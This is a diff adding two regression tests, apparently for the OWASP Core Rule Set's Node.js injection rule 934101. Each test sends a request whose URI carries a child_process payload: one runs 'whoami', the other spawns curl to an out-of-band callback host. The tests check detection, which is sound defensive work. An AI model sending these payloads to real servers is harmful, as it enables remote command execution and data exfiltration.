@@ -53,3 +53,35 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "934101"
+  - test_title: 934101-3
+    desc: require child_process
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: GET
+            port: 80
+            uri: /?foo=require("child_process").exec('whoami')
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-3
+    desc: require child_process spawn
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: GET
+            port: 80
+            uri: /rce/lol%3drequire%3bx%3d"child_process"%3blol(x).spawn('curl',+['5gmgdi7mjd5o3g8oj8gawq6n8ee5ht6.oastify.com'])%3b
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
